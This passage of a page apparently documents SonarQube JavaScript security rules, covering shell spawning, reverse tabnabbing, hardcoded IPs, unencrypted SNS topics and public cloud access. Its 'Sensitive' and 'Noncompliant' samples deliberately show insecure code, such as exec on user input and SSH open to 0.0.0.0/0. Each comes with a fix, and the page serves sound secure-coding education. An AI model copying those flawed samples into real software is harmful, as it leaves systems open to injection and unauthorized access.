<p>This rule will not raise an issue when the argument of the <code>eval</code> or <code>Function</code> is a literal string as it is reasonably
safe.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4721">
              javascript:S4721
            </a>
          </td>
          <td>
            <details>
              <p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be
used (when parameters are user-controlled for instance) to inject OS commands.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> OS command name or parameters are user-controlled. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use functions that don’t spawn a shell.</p>
<h2>Sensitive Code Example</h2>
<pre>
const cp &#61; require(&#39;child_process&#39;);

// A shell will be spawn in these following cases:
cp.exec(cmd); // Sensitive
cp.execSync(cmd); // Sensitive

cp.spawn(cmd, { shell: true }); // Sensitive
cp.spawnSync(cmd, { shell: true }); // Sensitive
cp.execFile(cmd, { shell: true }); // Sensitive
cp.execFileSync(cmd, { shell: true }); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const cp &#61; require(&#39;child_process&#39;);

cp.spawnSync(&#34;/usr/bin/file.exe&#34;, { shell: false }); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5148">
              javascript:S5148
            </a>
          </td>
          <td>
            <details>
              <p>A newly opened window having access back to the originating window could allow basic phishing attacks (the <code>window.opener</code> object is not
<code>null</code> and thus <code>window.opener.location</code> can be set to a malicious website by the opened page).</p>
<p>For instance, an attacker can put a link (say: &#34;http://example.com/mylink&#34;) on a popular website that changes, when opened, the original page to
&#34;http://example.com/fake_login&#34;. On &#34;http://example.com/fake_login&#34; there is a fake login page which could trick real users to enter their
credentials.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application opens untrusted external URL. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use <code>noopener</code> to prevent untrusted pages from abusing <code>window.opener</code>.</p>
<p>Note: In Chrome 88&#43;, Firefox 79&#43; or Safari 12.1&#43; <code>target&#61;_blank</code> on anchors implies <code>rel&#61;noopener</code> which make the protection
enabled by default.</p>
<h2>Sensitive Code Example</h2>
<pre>
window.open(&#34;https://example.com/dangerous&#34;);
</pre>
<h2>Compliant Solution</h2>
<pre>
window.open(&#34;https://example.com/dangerous&#34;, &#34;WindowName&#34;, &#34;noopener&#34;);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing" rel="nofollow">Reverse Tabnabbing</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/1022" rel="nofollow">MITRE, CWE-1022</a> - Use of Web Link to Untrusted Target with window.opener Access </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mathiasbynens.github.io/rel-noopener/" rel="nofollow">https://mathiasbynens.github.io/rel-noopener/</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S1313">
              javascript:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
ip &#61; &#34;192.168.12.42&#34;; // Sensitive

const net &#61; require(&#39;net&#39;);
var client &#61; new net.Socket();
client.connect(80, ip, function() {
  // ...
});
</pre>
<h2>Compliant Solution</h2>
<pre>
ip &#61; process.env.IP_ADDRESS; // Compliant

const net &#61; require(&#39;net&#39;);
var client &#61; new net.Socket();
client.connect(80, ip, function() {
  // ...
});
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID). </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the 2001:db8::/32 range, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6327">
              javascript:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The topic contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html" rel="nofollow"><code>aws_cdk.aws_sns.Topic</code></a></p>
<pre>
import { Topic } from &#39;aws-cdk-lib/aws-sns&#39;;

new Topic(this, &#39;exampleTopic&#39;); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html" rel="nofollow"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>
<pre>
import { Topic, CfnTopic } from &#39;aws-cdk-lib/aws-sns&#39;;

new CfnTopic(this, &#39;exampleCfnTopic&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html" rel="nofollow"><code>aws_cdk.aws_sns.Topic</code></a></p>
<pre>
import { Topic } from &#39;aws-cdk-lib/aws-sns&#39;;

const encryptionKey &#61; new Key(this, &#39;exampleKey&#39;, {
    enableKeyRotation: true,
});

new Topic(this, &#39;exampleTopic&#39;, {
    masterKey: encryptionKey
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html" rel="nofollow"><code>aws_cdk.aws_sns.CfnTopic</code></a></p>
<pre>
import { CfnTopic } from &#39;aws-cdk-lib/aws-sns&#39;;

const encryptionKey &#61; new Key(this, &#39;exampleKey&#39;, {
    enableKeyRotation: true,
});

cfnTopic &#61; new CfnTopic(this, &#39;exampleCfnTopic&#39;, {
    kmsMasterKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html" rel="nofollow">AWS Documentation</a> - Encryption at rest </li><li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/" rel="nofollow">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6329">
              javascript:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul><li> a boolean value that explicitly allows access to the public network. </li><li> the assignment of a public IP address. </li><li> database firewall rules that allow public IP ranges. </li></ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul><li> data breaches. </li><li> intrusions into the infrastructure to permanently steal from it. </li><li> and various malicious traffic, such as DDoS attacks. </li></ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul><li> should be publicly accessible to any Internet user. </li><li> requires inbound traffic from the Internet to function properly. </li></ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html" rel="nofollow">aws-cdk-lib.aws_ec2.Instance</a> and similar
constructs:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.Instance(this, &#34;example&#34;, {
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    vpcSubnets: {subnetType: ec2.SubnetType.PUBLIC} // Sensitive
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnInstance(this, &#34;example&#34;, {
    instanceType: &#34;t2.micro&#34;,
    imageId: &#34;ami-0ea0f26a6d50850c5&#34;,
    networkInterfaces: [
        {
            deviceIndex: &#34;0&#34;,
            associatePublicIpAddress: true, // Sensitive
            deleteOnTermination: true,
            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PUBLIC}).subnetIds[0]
        }
    ]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html" rel="nofollow">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new dms.CfnReplicationInstance(
    this, &#34;example&#34;, {
    replicationInstanceClass: &#34;dms.t2.micro&#34;,
    allocatedStorage: 5,
    publiclyAccessible: true, // Sensitive
    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,
    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const rdsSubnetGroupPublic &#61; new rds.CfnDBSubnetGroup(this, &#34;publicSubnet&#34;, {
    dbSubnetGroupDescription: &#34;Subnets&#34;,
    dbSubnetGroupName: &#34;publicSn&#34;,
    subnetIds: vpc.selectSubnets({
        subnetType: ec2.SubnetType.PUBLIC
    }).subnetIds
})

new rds.CfnDBInstance(this, &#34;example&#34;, {
    engine: &#34;postgres&#34;,
    masterUsername: &#34;foobar&#34;,
    masterUserPassword: &#34;12345678&#34;,
    dbInstanceClass: &#34;db.r5.large&#34;,
    allocatedStorage: &#34;200&#34;,
    iops: 1000,
    dbSubnetGroupName: rdsSubnetGroupPublic.ref,
    publiclyAccessible: true, // Sensitive
    vpcSecurityGroups: [sg.securityGroupId]
})
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html" rel="nofollow">aws-cdk-lib.aws_ec2.Instance</a> and similar
constructs:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.Instance(
    this,
    &#34;example&#34;, {
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    vpcSubnets: {subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnInstance.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnInstance(this, &#34;example&#34;, {
    instanceType: &#34;t2.micro&#34;,
    imageId: &#34;ami-0ea0f26a6d50850c5&#34;,
    networkInterfaces: [
        {
            deviceIndex: &#34;0&#34;,
            associatePublicIpAddress: false,
            deleteOnTermination: true,
            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}).subnetIds[0]
        }
    ]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html" rel="nofollow">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new dms.CfnReplicationInstance(
    this, &#34;example&#34;, {
    replicationInstanceClass: &#34;dms.t2.micro&#34;,
    allocatedStorage: 5,
    publiclyAccessible: false,
    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,
    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const rdsSubnetGroupPrivate &#61; new rds.CfnDBSubnetGroup(this, &#34;example&#34;,{
    dbSubnetGroupDescription: &#34;Subnets&#34;,
    dbSubnetGroupName: &#34;privateSn&#34;,
    subnetIds: vpc.selectSubnets({
        subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS
    }).subnetIds
})

new rds.CfnDBInstance(this, &#34;example&#34;, {
    engine: &#34;postgres&#34;,
    masterUsername: &#34;foobar&#34;,
    masterUserPassword: &#34;12345678&#34;,
    dbInstanceClass: &#34;db.r5.large&#34;,
    allocatedStorage: &#34;200&#34;,
    iops: 1000,
    dbSubnetGroupName: rdsSubnetGroupPrivate.ref,
    publiclyAccessible: false,
    vpcSecurityGroups: [sg.securityGroupId]
})
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html" rel="nofollow">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li><li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html" rel="nofollow">AWS Documentation</a> - Public and
  private replication instances </li><li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html" rel="nofollow">AWS Documentation</a> - VPC Peering </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4829">
              javascript:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-2337" rel="nofollow">CVE-2005-2337</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11449" rel="nofollow">CVE-2017-11449</a> </li></ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> data read from the standard input is not sanitized before being used. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
// All uses of process.stdin are security-sensitive and should be reviewed

process.stdin.on(&#39;readable&#39;, () &#61;&gt; {
	const chunk &#61; process.stdin.read(); // Sensitive
	if (chunk !&#61;&#61; null) {
		dosomething(chunk);
	}
});

const readline &#61; require(&#39;readline&#39;);
readline.createInterface({
	input: process.stdin // Sensitive
}).on(&#39;line&#39;, (input) &#61;&gt; {
	dosomething(input);
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4823">
              javascript:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-7281" rel="nofollow">CVE-2018-7281</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-12326" rel="nofollow">CVE-2018-12326</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2011-3198" rel="nofollow">CVE-2011-3198</a> </li></ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> any of the command line arguments are used without being sanitized first. </li><li> your application accepts sensitive information via command line arguments. </li></ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process&#39; standard input, or give the
path to a file containing the information.</p>
<h2>Sensitive Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
var param &#61; process.argv[2]; // Sensitive: check how the argument is used
console.log(&#39;Param: &#39; &#43; param);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://cwe.mitre.org/data/definitions/214" rel="nofollow">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6321">
              javascript:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and
outbound traffic.<br /> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services
traditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1&#61;h_ls" rel="nofollow">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html" rel="nofollow">aws-cdk-lib.aws_ec2.Instance</a> and other constructs
that support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const instance &#61; new ec2.Instance(this, &#34;default-own-security-group&#34;,{
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    instanceName: &#34;test-instance&#34;
})

instance.connections.allowFrom(
    ec2.Peer.anyIpv4(), // Noncompliant
    ec2.Port.tcp(22),
    /*description*/ &#34;Allows SSH from all IPv4&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html" rel="nofollow">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const securityGroup &#61; new ec2.SecurityGroup(this, &#34;custom-security-group&#34;, {
    vpc: vpc
})

securityGroup.addIngressRule(
    ec2.Peer.anyIpv4(), // Noncompliant
    ec2.Port.tcpRange(1, 1024)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnSecurityGroup(
    this,
    &#34;cfn-based-security-group&#34;, {
        groupDescription: &#34;cfn based security group&#34;,
        groupName: &#34;cfn-based-security-group&#34;,
        vpcId: vpc.vpcId,
        securityGroupIngress: [
            {
                ipProtocol: &#34;6&#34;,
                cidrIp: &#34;0.0.0.0/0&#34;, // Noncompliant
                fromPort: 22,
                toPort: 22
            }
        ]
    }
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnSecurityGroupIngress( // Noncompliant
    this,
    &#34;ingress-all-ip-tcp-ssh&#34;, {
        ipProtocol: &#34;tcp&#34;,
        cidrIp: &#34;0.0.0.0/0&#34;,
        fromPort: 22,
        toPort: 22,
        groupId: securityGroup.attrGroupId
})
</pre>
<h4>Compliant solution</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html" rel="nofollow">aws-cdk-lib.aws_ec2.Instance</a> and other constructs
that support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="compliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const instance &#61; new ec2.Instance(this, &#34;default-own-security-group&#34;,{
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    instanceName: &#34;test-instance&#34;
})

instance.connections.allowFrom(
    ec2.Peer.ipv4(&#34;192.0.2.0/24&#34;),
    ec2.Port.tcp(22),
    /*description*/ &#34;Allows SSH from a trusted range&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html" rel="nofollow">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="compliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const securityGroup3 &#61; new ec2.SecurityGroup(this, &#34;custom-security-group&#34;, {
    vpc: vpc
})

securityGroup3.addIngressRule(
    ec2.Peer.anyIpv4(),
    ec2.Port.tcpRange(1024, 1048)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="compliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnSecurityGroup(
    this,
    &#34;cfn-based-security-group&#34;, {
        groupDescription: &#34;cfn based security group&#34;,
        groupName: &#34;cfn-based-security-group&#34;,
        vpcId: vpc.vpcId,
        securityGroupIngress: [
            {
                ipProtocol: &#34;6&#34;,
                cidrIp: &#34;192.0.2.0/24&#34;,
                fromPort: 22,
                toPort: 22
            }
        ]
    }
)
</pre>
